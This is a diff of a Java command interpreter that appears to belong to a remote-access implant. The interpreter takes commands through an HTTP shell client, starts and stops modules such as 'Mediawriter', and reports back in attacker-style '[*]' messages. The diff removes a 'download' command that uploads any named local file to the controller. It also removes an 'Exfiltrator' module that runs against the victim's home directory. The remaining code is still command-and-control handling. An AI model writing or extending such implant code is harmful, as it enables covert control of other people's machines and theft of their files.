@@ -84,10 +84,6 @@ public class CmdInterpreter {
                 String moduleName = cmdTokens.nextToken();
                 startModule(moduleName);
             }
-            case "download" -> {
-                File file = new File(cmdTokens.nextToken());
-                uploadFile(file);
-            }
         }
     }
 
@@ -110,21 +106,6 @@ public class CmdInterpreter {
                 }
                 else {
                     shellHttpClient.sendCmdResult("[*] Failed to stop Mediawriter. Try again.");
-                }
-            }
-
-            case "exfiltrator" -> {
-                if(Exfiltrator.isStopped()) {
-                    shellHttpClient.sendCmdResult("[*] Exfitrator is already stopped.");
-                    return;
-                }
-
-                Exfiltrator.shutdown();
-                if(Exfiltrator.isStopped()) {
-                    shellHttpClient.sendCmdResult("[*] Exfiltrator stopped.");
-                }
-                else {
-                    shellHttpClient.sendCmdResult("[*] Failed to stop Exfiltrator. Try again.");
                 }
             }
         }
@@ -155,31 +136,8 @@ public class CmdInterpreter {
 
                 shellHttpClient.sendCmdResult("[*] Mediawriter started.");
             }
-
-            case "exfiltrator" -> {
-                if(!Exfiltrator.isStopped()) {
-                    shellHttpClient.sendCmdResult("[*] Exfiltrator is already running.");
-                    return;
-                }
-
-                Exfiltrator exfiltrator = new Exfiltrator(System.getProperty("user.home"));
-                manager.executeThread(exfiltrator);
-                shellHttpClient.sendCmdResult("[*] Exfiltrator started.");
-            }
         }
     }
-
-
-    /**
-        Service a file download by uploading the specified file to the API.
-
-        @param file Represents the local file to upload.
-     */
-    private void uploadFile(File file) {
-        Exfiltrator exfiltrator = new Exfiltrator(file.getParent());
-        exfiltrator.exfiltrate(file);
-    }
-
 
     /**
         Payload end validation of a command and it's arguments.
